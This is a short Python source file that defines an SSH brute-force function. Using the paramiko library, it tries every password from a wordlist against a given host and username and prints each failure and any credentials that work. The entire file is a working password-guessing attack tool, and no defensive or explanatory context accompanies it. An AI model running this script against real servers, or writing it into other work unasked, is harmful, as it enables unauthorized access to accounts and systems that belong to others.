import paramiko

def brute_force_ssh(target, username, wordlist):
    print(f"[SSH] Target: {target}, User: {username}")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for pwd in open(wordlist):
        try:
            ssh.connect(target, username=username, password=pwd.strip(), timeout=3)
            print(f"[+] Success: {username}:{pwd.strip()}")
            return
        except:
            print(f"[-] Failed: {pwd.strip()}")
    print("[!] Done testing SSH.")